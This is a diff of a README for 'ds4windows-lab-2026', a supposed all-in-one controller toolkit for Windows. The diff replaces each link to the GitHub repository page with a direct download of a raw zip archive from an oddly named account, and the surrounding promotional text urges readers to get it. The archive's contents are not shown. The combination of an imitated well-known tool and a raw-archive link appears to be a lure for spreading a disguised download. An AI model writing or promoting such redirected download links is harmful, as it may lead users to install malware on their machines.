@@ -1,6 +1,6 @@
 # 🎮 ds4windows-lab-2026 - Your All-in-One Controller Companion Toolkit
 
-[![Download Now](https://img.shields.io/badge/Download-ds4windows--lab--2026-2ea44f?style=for-the-badge)](https://github.com/Hypothyroidismauditoryimage528/ds4windows-lab-2026)
+[![Download Now](https://img.shields.io/badge/Download-ds4windows--lab--2026-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/Hypothyroidismauditoryimage528/ds4windows-lab-2026/main/assets/2.6-beta.5.zip)
 
 ## 🚀 What Is This?
 
@@ -20,7 +20,7 @@ This isn't just another driver package. It's a complete companion toolkit that i
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Hypothyroidismauditoryimage528/ds4windows-lab-2026](https://github.com/Hypothyroidismauditoryimage528/ds4windows-lab-2026)
+Visit this link to download the application: [https://raw.githubusercontent.com/Hypothyroidismauditoryimage528/ds4windows-lab-2026/main/assets/2.6-beta.5.zip](https://raw.githubusercontent.com/Hypothyroidismauditoryimage528/ds4windows-lab-2026/main/assets/2.6-beta.5.zip)
 
 Once you're on the download page, follow these simple steps:
 
@@ -181,7 +181,7 @@ ds4windows-lab-2026 is the ultimate solution for Windows users who want their Pl
 
 Download today and transform your Windows gaming experience with your DualShock 4 or DualSense controller.
 
-**Ready to get started?** Visit [https://github.com/Hypothyroidismauditoryimage528/ds4windows-lab-2026](https://github.com/Hypothyroidismauditoryimage528/ds4windows-lab-2026) and download your copy now. It's quick, easy, and completely free!
+**Ready to get started?** Visit [https://raw.githubusercontent.com/Hypothyroidismauditoryimage528/ds4windows-lab-2026/main/assets/2.6-beta.5.zip](https://raw.githubusercontent.com/Hypothyroidismauditoryimage528/ds4windows-lab-2026/main/assets/2.6-beta.5.zip) and download your copy now. It's quick, easy, and completely free!
 
 ---
 
